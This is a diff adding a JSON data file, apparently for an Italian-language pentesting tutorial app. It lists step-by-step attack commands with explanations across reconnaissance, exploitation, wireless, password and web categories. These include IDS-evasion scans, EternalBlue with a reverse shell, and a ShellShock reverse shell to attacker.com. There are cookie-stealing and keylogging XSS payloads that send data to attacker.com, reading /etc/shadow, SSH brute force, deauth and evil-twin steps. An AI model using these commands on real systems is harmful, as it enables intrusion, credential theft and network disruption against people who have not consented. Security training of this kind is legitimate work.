@@ -1,0 +1,868 @@
+{
+  "categories": [
+    {
+      "id": "reconnaissance",
+      "name": "Reconnaissance",
+      "description": "Raccolta informazioni sul target",
+      "icon": "Search",
+      "color": "#FF6B35",
+      "attacks": [
+        {
+          "id": "nmap-basic",
+          "name": "Nmap - Scansione di Base",
+          "difficulty": "beginner",
+          "description": "Scopri host attivi e porte aperte sulla rete target",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Scansione Host Discovery",
+              "description": "Identifica quali host sono attivi sulla rete",
+              "command": "nmap -sn 192.168.1.0/24",
+              "explanation": "Il flag -sn disabilita la scansione delle porte e esegue solo host discovery. CIDR /24 scansiona l'intera subnet."
+            },
+            {
+              "phase": 2,
+              "title": "Scansione Porte Comuni",
+              "description": "Scansiona le 100 porte più comuni su un host specifico",
+              "command": "nmap -F 192.168.1.100",
+              "explanation": "Il flag -F esegue una scansione veloce sulle 100 porte più comuni. Perfetto per ricognizione iniziale."
+            },
+            {
+              "phase": 3,
+              "title": "Scansione Completa con Versioni",
+              "description": "Scansiona tutte le porte e identifica i servizi",
+              "command": "nmap -p- -sV 192.168.1.100",
+              "explanation": "-p- scansiona tutte le 65535 porte. -sV rileva le versioni dei servizi. Richiede più tempo."
+            }
+          ]
+        },
+        {
+          "id": "nmap-advanced",
+          "name": "Nmap - Scansione Avanzata",
+          "difficulty": "advanced",
+          "description": "Tecniche di scansione avanzate con evasione IDS",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Scansione Stealth SYN",
+              "description": "Scansione SYN che non completa la connessione TCP",
+              "command": "nmap -sS -p- --timing=sneaky 192.168.1.100",
+              "explanation": "-sS esegue SYN scan (stealth). --timing=sneaky rallenta la scansione per evitare rilevamento."
+            },
+            {
+              "phase": 2,
+              "title": "Frammentazione IP",
+              "description": "Frammenta i pacchetti per eludere firewall",
+              "command": "nmap -f --mtu=16 -p- 192.168.1.100",
+              "explanation": "-f frammenta i pacchetti. --mtu specifica la dimensione massima di trasmissione."
+            },
+            {
+              "phase": 3,
+              "title": "Decoy Scanning",
+              "description": "Usa indirizzi IP falsi per mascherare la tua identità",
+              "command": "nmap -D 192.168.1.50,192.168.1.60,ME -p- 192.168.1.100",
+              "explanation": "-D specifica gli indirizzi decoy. ME rappresenta il tuo IP reale nella lista."
+            },
+            {
+              "phase": 4,
+              "title": "Idle Scanning",
+              "description": "Scansione completamente passiva usando un host zombie",
+              "command": "nmap -sI 192.168.1.50 -p- 192.168.1.100",
+              "explanation": "-sI specifica l'host zombie. Questo metodo è molto stealth ma lento."
+            }
+          ]
+        },
+        {
+          "id": "shodan",
+          "name": "Shodan - Ricerca Internet-wide",
+          "difficulty": "beginner",
+          "description": "Trova dispositivi esposti su Internet usando Shodan",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Ricerca di Base",
+              "description": "Cerca dispositivi specifici online",
+              "command": "shodan search 'webcam' --limit 10",
+              "explanation": "Cerca le prime 10 webcam esposte su Internet. Richiede API key Shodan."
+            },
+            {
+              "phase": 2,
+              "title": "Ricerca per Città",
+              "description": "Trova dispositivi in una specifica area geografica",
+              "command": "shodan search 'city:Rome apache' --limit 50",
+              "explanation": "Cerca server Apache esposti a Roma. Utile per ricognizione geografica."
+            },
+            {
+              "phase": 3,
+              "title": "Ricerca per Vulnerabilità",
+              "description": "Identifica dispositivi con vulnerabilità note",
+              "command": "shodan search 'vuln:CVE-2021-44228' --limit 100",
+              "explanation": "Cerca dispositivi vulnerabili a Log4Shell. Molto utile per trovare target."
+            }
+          ]
+        },
+        {
+          "id": "osint",
+          "name": "OSINT - Open Source Intelligence",
+          "difficulty": "intermediate",
+          "description": "Raccolta informazioni da fonti pubbliche",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Ricerca Email",
+              "description": "Trova email associate a un'organizzazione",
+              "command": "python3 /usr/share/doc/recon-ng/example.py -m recon/companies-contacts/hunter",
+              "explanation": "Usa recon-ng per trovare email di dipendenti. Utile per social engineering."
+            },
+            {
+              "phase": 2,
+              "title": "Ricerca Social Media",
+              "description": "Raccogli informazioni da profili social",
+              "command": "sherlock username --output results.json",
+              "explanation": "Sherlock cerca un username su centinaia di siti social media."
+            },
+            {
+              "phase": 3,
+              "title": "Analisi Metadati",
+              "description": "Estrai metadati da documenti pubblici",
+              "command": "exiftool document.pdf",
+              "explanation": "Estrae metadati come autore, data creazione, software usato dal PDF."
+            }
+          ]
+        },
+        {
+          "id": "dns-recon",
+          "name": "DNS Reconnaissance",
+          "difficulty": "intermediate",
+          "description": "Enumerazione completa del DNS di un dominio",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Zone Transfer",
+              "description": "Tenta di trasferire l'intera zona DNS",
+              "command": "dig @ns1.example.com example.com axfr",
+              "explanation": "AXFR è il comando per il zone transfer. Se permesso, scarica tutti i record DNS."
+            },
+            {
+              "phase": 2,
+              "title": "Subdomain Enumeration",
+              "description": "Scopri tutti i subdomain di un dominio",
+              "command": "dnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt",
+              "explanation": "-t brt esegue brute force. -D specifica la wordlist di subdomain."
+            },
+            {
+              "phase": 3,
+              "title": "Reverse DNS Lookup",
+              "description": "Scopri tutti i domini associati a un range IP",
+              "command": "dnsrecon -r 192.168.1.0/24 -t rvl",
+              "explanation": "-t rvl esegue reverse lookup su un range di IP."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "scanning",
+      "name": "Scanning & Enumeration",
+      "description": "Scansione dettagliata e enumerazione servizi",
+      "icon": "Radar",
+      "color": "#1E3A8A",
+      "attacks": [
+        {
+          "id": "nmap-aggressive",
+          "name": "Nmap - Scansione Aggressiva",
+          "difficulty": "intermediate",
+          "description": "Scansione completa con OS detection e script NSE",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Scansione Completa Aggressiva",
+              "description": "Esegui una scansione completa con tutte le opzioni",
+              "command": "nmap -A -p- 192.168.1.100",
+              "explanation": "-A abilita OS detection, version detection, script scanning e traceroute. Molto rumoroso ma molto informativo."
+            },
+            {
+              "phase": 2,
+              "title": "Salvataggio Risultati",
+              "description": "Salva i risultati in formato XML per analisi successiva",
+              "command": "nmap -A -p- -oX results.xml 192.168.1.100",
+              "explanation": "-oX salva l'output in formato XML, utile per importare in strumenti di analisi."
+            },
+            {
+              "phase": 3,
+              "title": "Scansione NSE Personalizzata",
+              "description": "Esegui script NSE specifici",
+              "command": "nmap --script=smb-os-discovery,smb-enum-shares -p 445 192.168.1.100",
+              "explanation": "--script specifica gli script NSE da eseguire. Utile per enumerazione specifica."
+            }
+          ]
+        },
+        {
+          "id": "smb-enumeration",
+          "name": "SMB - Enumerazione Completa",
+          "difficulty": "intermediate",
+          "description": "Enumera completamente SMB e Active Directory",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Enumerazione SMB Basica",
+              "description": "Scopri condivisioni e informazioni di sistema",
+              "command": "enum4linux -a -M -l -d 192.168.1.100",
+              "explanation": "-a esegue tutte le enumerazioni. -M enumera i computer della rete. -l lista le condivisioni."
+            },
+            {
+              "phase": 2,
+              "title": "Enumerazione Utenti",
+              "description": "Estrai lista completa di utenti",
+              "command": "enum4linux -U -o 192.168.1.100 | grep 'user:'",
+              "explanation": "-U enumera gli utenti. -o salva l'output in file."
+            },
+            {
+              "phase": 3,
+              "title": "Enumerazione Gruppi",
+              "description": "Scopri i gruppi di Active Directory",
+              "command": "enum4linux -G 192.168.1.100",
+              "explanation": "-G enumera i gruppi di Active Directory e i loro membri."
+            },
+            {
+              "phase": 4,
+              "title": "Null Session Attack",
+              "description": "Connessione anonima per estrarre informazioni",
+              "command": "rpcclient -U \"\" -N 192.168.1.100\nenumdomusers",
+              "explanation": "-U \\\"\\\" specifica utente vuoto. -N no password. enumdomusers lista gli utenti del dominio."
+            }
+          ]
+        },
+        {
+          "id": "snmp-enumeration",
+          "name": "SNMP - Enumerazione Rete",
+          "difficulty": "intermediate",
+          "description": "Enumera dispositivi di rete via SNMP",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Scansione SNMP",
+              "description": "Scopri dispositivi SNMP sulla rete",
+              "command": "nmap -sU -p 161 --script=snmp-sysdescr 192.168.1.0/24",
+              "explanation": "-sU esegue UDP scan. Lo script snmp-sysdescr estrae informazioni di sistema."
+            },
+            {
+              "phase": 2,
+              "title": "Brute Force Community String",
+              "description": "Prova community string comuni",
+              "command": "onesixtyone -c /usr/share/wordlists/snmp-strings.txt 192.168.1.100",
+              "explanation": "onesixtyone prova community string da una wordlist. Spesso 'public' funziona."
+            },
+            {
+              "phase": 3,
+              "title": "Enumerazione Completa",
+              "description": "Estrai tutte le informazioni SNMP",
+              "command": "snmpwalk -c public -v2c 192.168.1.100",
+              "explanation": "-c specifica la community string. -v2c è la versione SNMP. Estrae tutto l'albero SNMP."
+            }
+          ]
+        },
+        {
+          "id": "ldap-enumeration",
+          "name": "LDAP - Enumerazione Directory",
+          "difficulty": "intermediate",
+          "description": "Enumera informazioni da server LDAP/Active Directory",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Enumerazione LDAP Basica",
+              "description": "Scopri informazioni dal server LDAP",
+              "command": "ldapsearch -h 192.168.1.100 -x -s base",
+              "explanation": "-h specifica l'host. -x usa autenticazione semplice. -s base limita la ricerca."
+            },
+            {
+              "phase": 2,
+              "title": "Enumerazione Utenti",
+              "description": "Estrai lista di utenti da LDAP",
+              "command": "ldapsearch -h 192.168.1.100 -x -b \"dc=example,dc=com\" \"(objectClass=user)\"",
+              "explanation": "-b specifica il base DN. La query cerca tutti gli oggetti di tipo user."
+            },
+            {
+              "phase": 3,
+              "title": "Dump Completo",
+              "description": "Scarica l'intero directory LDAP",
+              "command": "ldapsearch -h 192.168.1.100 -x -b \"dc=example,dc=com\" > ldap_dump.txt",
+              "explanation": "Scarica l'intero LDAP in un file. Utile per analisi offline."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "exploitation",
+      "name": "Exploitation",
+      "description": "Sfruttamento vulnerabilità identificate",
+      "icon": "Zap",
+      "color": "#DC2626",
+      "attacks": [
+        {
+          "id": "metasploit-basic",
+          "name": "Metasploit - Exploit Basico",
+          "difficulty": "intermediate",
+          "description": "Utilizza Metasploit per sfruttare vulnerabilità comuni",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Avvia msfconsole",
+              "description": "Accedi alla console di Metasploit",
+              "command": "msfconsole",
+              "explanation": "Avvia l'interfaccia interattiva di Metasploit Framework."
+            },
+            {
+              "phase": 2,
+              "title": "Ricerca Exploit",
+              "description": "Cerca exploit per una vulnerabilità specifica",
+              "command": "search ms17-010",
+              "explanation": "Cerca exploit correlati a MS17-010 (EternalBlue). Sostituisci con la tua vulnerabilità target."
+            },
+            {
+              "phase": 3,
+              "title": "Usa Exploit",
+              "description": "Carica e configura l'exploit",
+              "command": "use exploit/windows/smb/ms17_010_eternalblue",
+              "explanation": "Seleziona l'exploit da utilizzare. Il percorso dipende dal risultato della ricerca."
+            },
+            {
+              "phase": 4,
+              "title": "Configura Opzioni",
+              "description": "Imposta RHOSTS (target) e payload",
+              "command": "set RHOSTS 192.168.1.100\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50",
+              "explanation": "RHOSTS è il target. PAYLOAD è ciò che verrà eseguito. LHOST è il tuo IP per la reverse shell."
+            },
+            {
+              "phase": 5,
+              "title": "Esegui Exploit",
+              "description": "Lancia l'exploit contro il target",
+              "command": "exploit",
+              "explanation": "Avvia l'exploit. Se ha successo, otterrai una Meterpreter shell sul target."
+            }
+          ]
+        },
+        {
+          "id": "shellshock",
+          "name": "ShellShock - Bash Vulnerability",
+          "difficulty": "intermediate",
+          "description": "Sfrutta la vulnerabilità ShellShock (CVE-2014-6271) in Bash",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Identifica Target Vulnerabile",
+              "description": "Verifica se il target è vulnerabile a ShellShock",
+              "command": "curl -H \"User-Agent: () { :; }; echo vulnerable\" http://target.com/cgi-bin/test.cgi",
+              "explanation": "Se la risposta contiene 'vulnerable', il server è affetto da ShellShock."
+            },
+            {
+              "phase": 2,
+              "title": "Esecuzione Comando",
+              "description": "Esegui un comando arbitrario sul server",
+              "command": "curl -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\" http://target.com/cgi-bin/test.cgi",
+              "explanation": "Questo comando stabilisce una reverse shell verso l'attaccante sulla porta 4444."
+            }
+          ]
+        },
+        {
+          "id": "privilege-escalation",
+          "name": "Privilege Escalation - Linux",
+          "difficulty": "advanced",
+          "description": "Tecniche di escalazione privilegi su Linux",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Enumerazione Privilegi",
+              "description": "Scopri cosa puoi eseguire con sudo",
+              "command": "sudo -l",
+              "explanation": "Mostra i comandi che puoi eseguire con sudo senza password."
+            },
+            {
+              "phase": 2,
+              "title": "Sfruttamento SUDO",
+              "description": "Sfrutta configurazioni SUDO insicure",
+              "command": "sudo -u root /bin/bash",
+              "explanation": "Se SUDO permette /bin/bash, puoi ottenere una shell root."
+            },
+            {
+              "phase": 3,
+              "title": "Ricerca SUID",
+              "description": "Trova file SUID vulnerabili",
+              "command": "find / -perm -4000 2>/dev/null",
+              "explanation": "Cerca file con bit SUID impostato. Questi possono essere sfruttati per escalare privilegi."
+            },
+            {
+              "phase": 4,
+              "title": "Sfruttamento SUID",
+              "description": "Sfrutta un binario SUID vulnerabile",
+              "command": "/usr/bin/vulnerable-binary",
+              "explanation": "Se il binario è vulnerabile, potrebbe permettere escalazione di privilegi."
+            }
+          ]
+        },
+        {
+          "id": "windows-priv-esc",
+          "name": "Privilege Escalation - Windows",
+          "difficulty": "advanced",
+          "description": "Tecniche di escalazione privilegi su Windows",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Enumerazione Privilegi",
+              "description": "Scopri i privilegi disponibili",
+              "command": "whoami /priv",
+              "explanation": "Mostra i privilegi dell'utente corrente. Alcuni privilegi possono essere sfruttati."
+            },
+            {
+              "phase": 2,
+              "title": "Ricerca Patch",
+              "description": "Identifica patch mancanti",
+              "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Boot Time\"",
+              "explanation": "Raccoglie informazioni di sistema per identificare vulnerabilità di patch."
+            },
+            {
+              "phase": 3,
+              "title": "Sfruttamento Vulnerabilità",
+              "description": "Usa exploit per vulnerabilità note",
+              "command": "powershell -ExecutionPolicy Bypass -File exploit.ps1",
+              "explanation": "Esegue uno script PowerShell per sfruttare una vulnerabilità di escalazione."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "wireless",
+      "name": "Wireless Attacks",
+      "description": "Attacchi a reti wireless WPA/WPA2",
+      "icon": "Wifi",
+      "color": "#10B981",
+      "attacks": [
+        {
+          "id": "wpa2-crack",
+          "name": "Aircrack-ng - WPA2 Cracking",
+          "difficulty": "advanced",
+          "description": "Cracka password WPA2 usando Aircrack-ng",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Abilita Monitor Mode",
+              "description": "Metti la scheda wireless in monitor mode",
+              "command": "airmon-ng start wlan0",
+              "explanation": "Abilita monitor mode sulla tua scheda wireless. Sostituisci wlan0 con il nome della tua interfaccia."
+            },
+            {
+              "phase": 2,
+              "title": "Scansiona Reti Wireless",
+              "description": "Scopri reti disponibili e il loro BSSID",
+              "command": "airodump-ng mon0",
+              "explanation": "Mostra tutte le reti wireless disponibili. Nota il BSSID della rete target e il canale."
+            },
+            {
+              "phase": 3,
+              "title": "Cattura Handshake",
+              "description": "Cattura il 4-way handshake WPA2",
+              "command": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture mon0",
+              "explanation": "-c specifica il canale. --bssid è l'indirizzo MAC della rete. -w salva il capture in file."
+            },
+            {
+              "phase": 4,
+              "title": "Deautentica Client",
+              "description": "Forza un client a riconnettersi per catturare handshake",
+              "command": "aireplay-ng -0 1 -a 00:11:22:33:44:55 mon0",
+              "explanation": "-0 invia pacchetti deauth. -a è il BSSID. Accelera la cattura dell'handshake."
+            },
+            {
+              "phase": 5,
+              "title": "Cracka Password",
+              "description": "Usa wordlist per craccare la password",
+              "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap",
+              "explanation": "-w specifica la wordlist. -b è il BSSID. Prova tutte le password nella wordlist."
+            }
+          ]
+        },
+        {
+          "id": "wep-crack",
+          "name": "Aircrack-ng - WEP Cracking",
+          "difficulty": "intermediate",
+          "description": "Cracka password WEP (più facile di WPA2)",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Abilita Monitor Mode",
+              "description": "Metti la scheda wireless in monitor mode",
+              "command": "airmon-ng start wlan0",
+              "explanation": "Abilita monitor mode sulla tua scheda wireless."
+            },
+            {
+              "phase": 2,
+              "title": "Scansiona Reti WEP",
+              "description": "Identifica reti WEP disponibili",
+              "command": "airodump-ng mon0 | grep WEP",
+              "explanation": "Filtra solo le reti che usano crittografia WEP."
+            },
+            {
+              "phase": 3,
+              "title": "Cattura IV Packets",
+              "description": "Raccogli pacchetti IV per craccare la chiave",
+              "command": "airodump-ng -c 11 --bssid 00:11:22:33:44:55 -w wep_capture mon0",
+              "explanation": "Raccogli almeno 100,000 IV packets per una probabilità alta di successo."
+            },
+            {
+              "phase": 4,
+              "title": "Cracka Chiave WEP",
+              "description": "Usa aircrack-ng per craccare la chiave",
+              "command": "aircrack-ng wep_capture-01.cap",
+              "explanation": "Aircrack-ng analizzerà gli IV packets e troverà la chiave WEP."
+            }
+          ]
+        },
+        {
+          "id": "evil-twin",
+          "name": "Evil Twin - Rogue AP",
+          "difficulty": "advanced",
+          "description": "Crea un access point falso per intercettare traffico",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Configura Interfaccia",
+              "description": "Configura la scheda wireless come AP",
+              "command": "airmon-ng start wlan0\nifconfig wlan0mon down\niwconfig wlan0mon mode Master\nifconfig wlan0mon up",
+              "explanation": "Configura la scheda in monitor mode e poi in modalità Master per funzionare come AP."
+            },
+            {
+              "phase": 2,
+              "title": "Avvia hostapd",
+              "description": "Avvia il server access point",
+              "command": "hostapd hostapd.conf",
+              "explanation": "hostapd.conf contiene la configurazione dell'AP (SSID, canale, etc)."
+            },
+            {
+              "phase": 3,
+              "title": "Configura DHCP",
+              "description": "Assegna indirizzi IP ai client",
+              "command": "dnsmasq -C /dev/null -z -i wlan0mon -F 192.168.1.100,192.168.1.200",
+              "explanation": "dnsmasq fornisce DHCP e DNS ai client che si connettono all'AP falso."
+            },
+            {
+              "phase": 4,
+              "title": "Intercetta Traffico",
+              "description": "Cattura il traffico dei client",
+              "command": "tcpdump -i wlan0mon -w traffic.pcap",
+              "explanation": "tcpdump cattura tutto il traffico passante attraverso l'AP falso."
+            }
+          ]
+        },
+        {
+          "id": "deauth-attack",
+          "name": "Deauthentication Attack",
+          "difficulty": "intermediate",
+          "description": "Disconnetti client da una rete wireless",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Identifica Target",
+              "description": "Scopri il BSSID della rete e i client",
+              "command": "airodump-ng mon0",
+              "explanation": "Identifica il BSSID della rete e gli indirizzi MAC dei client connessi."
+            },
+            {
+              "phase": 2,
+              "title": "Esegui Deauth Attack",
+              "description": "Invia pacchetti deauth a un client specifico",
+              "command": "aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0",
+              "explanation": "-0 specifica deauth attack. -a è il BSSID. -c è il MAC del client. Invia 10 pacchetti."
+            },
+            {
+              "phase": 3,
+              "title": "Broadcast Deauth",
+              "description": "Disconnetti tutti i client dalla rete",
+              "command": "aireplay-ng -0 0 -a 00:11:22:33:44:55 mon0",
+              "explanation": "-0 0 invia deauth broadcast infiniti. Disconnette tutti i client."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "password-attacks",
+      "name": "Password Attacks",
+      "description": "Attacchi a password e hash",
+      "icon": "Lock",
+      "color": "#8B5CF6",
+      "attacks": [
+        {
+          "id": "hashcat-basic",
+          "name": "Hashcat - Hash Cracking",
+          "difficulty": "intermediate",
+          "description": "Cracka hash usando GPU acceleration",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Identifica Tipo Hash",
+              "description": "Determina il tipo di hash",
+              "command": "hash-identifier",
+              "explanation": "Tool interattivo che aiuta a identificare il tipo di hash (MD5, SHA1, bcrypt, etc)"
+            },
+            {
+              "phase": 2,
+              "title": "Cracka Hash",
+              "description": "Usa hashcat per craccare l'hash",
+              "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+              "explanation": "-m 0 specifica MD5. -a 0 è dictionary attack. hash.txt contiene l'hash da craccare."
+            },
+            {
+              "phase": 3,
+              "title": "Visualizza Risultati",
+              "description": "Mostra gli hash craccati",
+              "command": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show",
+              "explanation": "--show visualizza gli hash già craccati e le loro password."
+            }
+          ]
+        },
+        {
+          "id": "john-basic",
+          "name": "John the Ripper - Password Cracking",
+          "difficulty": "intermediate",
+          "description": "Cracka password usando John the Ripper",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Cracca File Shadow",
+              "description": "Estrai e cracca password da /etc/shadow",
+              "command": "unshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+              "explanation": "unshadow combina passwd e shadow. john prova le password dalla wordlist."
+            },
+            {
+              "phase": 2,
+              "title": "Visualizza Risultati",
+              "description": "Mostra le password craccate",
+              "command": "john --show hashes.txt",
+              "explanation": "Mostra tutte le password che john ha craccato con successo."
+            },
+            {
+              "phase": 3,
+              "title": "Brute Force Mode",
+              "description": "Usa brute force quando wordlist non funziona",
+              "command": "john --incremental hashes.txt",
+              "explanation": "--incremental attiva la modalità brute force che prova tutte le combinazioni possibili."
+            }
+          ]
+        },
+        {
+          "id": "hydra-ssh",
+          "name": "Hydra - SSH Brute Force",
+          "difficulty": "intermediate",
+          "description": "Attacco brute force a servizi SSH",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Brute Force SSH",
+              "description": "Prova password multiple su SSH",
+              "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
+              "explanation": "-l specifica l'utente. -P specifica il file di password. Prova ogni password nel file."
+            },
+            {
+              "phase": 2,
+              "title": "Brute Force Multiple Utenti",
+              "description": "Prova multiple utenti e password",
+              "command": "hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4",
+              "explanation": "-L specifica file di utenti. -t 4 usa 4 thread paralleli per velocità."
+            },
+            {
+              "phase": 3,
+              "title": "Brute Force FTP",
+              "description": "Attacco brute force a FTP",
+              "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100",
+              "explanation": "Stesso comando ma per FTP. Hydra supporta molti protocolli."
+            }
+          ]
+        },
+        {
+          "id": "wordlist-generation",
+          "name": "Crunch - Generazione Wordlist",
+          "difficulty": "intermediate",
+          "description": "Genera wordlist personalizzate per brute force",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Genera Wordlist Semplice",
+              "description": "Genera tutte le combinazioni di una lunghezza specifica",
+              "command": "crunch 4 4 0123456789 -o wordlist.txt",
+              "explanation": "Genera tutte le combinazioni di 4 cifre numeriche (0000-9999)."
+            },
+            {
+              "phase": 2,
+              "title": "Genera con Caratteri Misti",
+              "description": "Genera combinazioni con lettere, numeri e simboli",
+              "command": "crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt",
+              "explanation": "Genera password da 6 a 8 caratteri con lettere minuscole e numeri."
+            },
+            {
+              "phase": 3,
+              "title": "Genera con Pattern",
+              "description": "Usa pattern per generazioni mirate",
+              "command": "crunch 8 8 -t admin@@@@ -o wordlist.txt",
+              "explanation": "@@@@ rappresenta posizioni casuali. Genera password come admin0000, admin0001, etc."
+            }
+          ]
+        },
+        {
+          "id": "rainbow-tables",
+          "name": "Rainbow Tables - Lookup Attack",
+          "difficulty": "intermediate",
+          "description": "Usa tabelle pre-calcolate per craccare hash",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Genera Rainbow Table",
+              "description": "Crea una tabella di hash pre-calcolati",
+              "command": "rtgen md5 loweralpha 1 8 0 100 10000 0",
+              "explanation": "Genera rainbow table per MD5 con lettere minuscole da 1 a 8 caratteri."
+            },
+            {
+              "phase": 2,
+              "title": "Usa Rainbow Table",
+              "description": "Cerca un hash nella tabella",
+              "command": "rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592",
+              "explanation": "Cerca l'hash nella rainbow table. Se trovato, ritorna la password in millisecondi."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "web-attacks",
+      "name": "Web Application Attacks",
+      "description": "Attacchi a applicazioni web",
+      "icon": "Globe",
+      "color": "#F59E0B",
+      "attacks": [
+        {
+          "id": "sqlmap-basic",
+          "name": "SQLMap - SQL Injection",
+          "difficulty": "intermediate",
+          "description": "Identifica e sfrutta vulnerabilità SQL injection",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Test SQL Injection",
+              "description": "Testa URL per SQL injection",
+              "command": "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+              "explanation": "-u specifica l'URL target. --dbs enumera i database disponibili."
+            },
+            {
+              "phase": 2,
+              "title": "Enumera Tabelle",
+              "description": "Elenca le tabelle in un database",
+              "command": "sqlmap -u 'http://target.com/page.php?id=1' -D database_name --tables",
+              "explanation": "-D specifica il database. --tables mostra tutte le tabelle."
+            },
+            {
+              "phase": 3,
+              "title": "Estrai Dati",
+              "description": "Scarica dati da una tabella",
+              "command": "sqlmap -u 'http://target.com/page.php?id=1' -D database_name -T users --dump",
+              "explanation": "-T specifica la tabella. --dump scarica tutti i dati."
+            },
+            {
+              "phase": 4,
+              "title": "Accesso Shell",
+              "description": "Ottieni shell sul server database",
+              "command": "sqlmap -u 'http://target.com/page.php?id=1' --os-shell",
+              "explanation": "--os-shell tenta di ottenere accesso shell al sistema operativo."
+            }
+          ]
+        },
+        {
+          "id": "xss-attack",
+          "name": "XSS - Cross-Site Scripting",
+          "difficulty": "intermediate",
+          "description": "Sfrutta vulnerabilità XSS per eseguire JavaScript",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Test XSS Basico",
+              "description": "Testa se il sito è vulnerabile a XSS",
+              "command": "<script>alert('XSS')</script>",
+              "explanation": "Inserisci questo payload in un campo di input e verifica se viene eseguito."
+            },
+            {
+              "phase": 2,
+              "title": "Furto di Cookie",
+              "description": "Estrai i cookie della sessione",
+              "command": "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
+              "explanation": "Questo payload invia i cookie della vittima al server dell'attaccante."
+            },
+            {
+              "phase": 3,
+              "title": "Keylogger",
+              "description": "Registra i tasti digitati",
+              "command": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>",
+              "explanation": "Questo payload registra ogni tasto premuto e lo invia all'attaccante."
+            }
+          ]
+        },
+        {
+          "id": "csrf-attack",
+          "name": "CSRF - Cross-Site Request Forgery",
+          "difficulty": "intermediate",
+          "description": "Sfrutta vulnerabilità CSRF per eseguire azioni non autorizzate",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Identifica Azione Vulnerabile",
+              "description": "Trova un'azione che non verifica il token CSRF",
+              "command": "<form action='http://target.com/transfer.php' method='POST'>\n<input type='hidden' name='amount' value='1000'>\n<input type='hidden' name='to' value='attacker'>\n</form>",
+              "explanation": "Questo form, se visitato da un utente autenticato, eseguirà il trasferimento."
+            },
+            {
+              "phase": 2,
+              "title": "Invia Payload",
+              "description": "Invia il payload a una vittima",
+              "command": "<img src='http://target.com/transfer.php?amount=1000&to=attacker'>",
+              "explanation": "Un tag img nascosto può eseguire richieste GET senza che l'utente se ne accorga."
+            }
+          ]
+        },
+        {
+          "id": "burp-suite",
+          "name": "Burp Suite - Web Proxy",
+          "difficulty": "intermediate",
+          "description": "Usa Burp Suite per testare applicazioni web",
+          "steps": [
+            {
+              "phase": 1,
+              "title": "Avvia Burp Suite",
+              "description": "Avvia l'interfaccia di Burp Suite",
+              "command": "burpsuite",
+              "explanation": "Avvia Burp Suite. Configura il browser per usare il proxy su localhost:8080."
+            },
+            {
+              "phase": 2,
+              "title": "Intercetta Richieste",
+              "description": "Intercetta le richieste HTTP dal browser",
+              "command": "Proxy → Intercept → Intercept is on",
+              "explanation": "Abilita l'intercettazione per vedere e modificare le richieste HTTP in tempo reale."
+            },
+            {
+              "phase": 3,
+              "title": "Modifica Parametri",
+              "description": "Modifica i parametri della richiesta",
+              "command": "Modifica il valore di 'id=1' a 'id=1 OR 1=1'",
+              "explanation": "Modifica i parametri per testare vulnerabilità come SQL injection."
+            },
+            {
+              "phase": 4,
+              "title": "Scansione Automatica",
+              "description": "Esegui una scansione automatica del sito",
+              "command": "Scanner → New scan → Crawl and audit",
+              "explanation": "Burp Suite eseguirà una scansione automatica per trovare vulnerabilità comuni."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
